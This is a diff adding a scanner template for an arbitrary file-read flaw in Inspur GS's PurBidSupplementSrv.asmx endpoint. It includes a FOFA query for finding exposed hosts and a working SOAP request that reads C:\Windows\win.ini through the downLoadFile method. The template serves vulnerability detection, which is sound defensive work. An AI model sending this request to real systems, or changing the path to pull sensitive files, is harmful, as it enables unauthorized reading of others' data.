@@ -1,0 +1,37 @@
+id: inspur-gs-purbidsupplementsrv-lfi
+
+info:
+  name: Inspur GS PurBidSupplementSrv.asmx 文件访问控制缺陷
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/cwbase/web/gsprtf/"
+      该检测模板针对Inspur GS PurBidSupplementSrv.asmx接口的文件访问控制缺陷进行验证。攻击者可利用该缺陷通过路径遍历等技术读取任意文件内容，可能暴露敏感系统信息或配置数据。漏洞存在于2025-08-04披露窗口期内，需结合具体系统路径进行验证。
+  tags: 浪潮GS企业管理软件
+
+http:
+- raw:
+  - |
+    POST /cwbase/service/cepp/PurBidSupplementSrv.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate, br
+    Cookie: GSPWebLanguageKey=zh-CN
+
+    <?xml version="1.0"?>
+    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+    <soap:Body xmlns:m="http://tempuri.org/">
+    <m:downLoadFile>
+    <m:filePath>C:\\Windows\\win.ini</m:filePath>
+    <m:offset>0</m:offset>
+    </m:downLoadFile>
+    </soap:Body>
+    </soap:Envelope>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
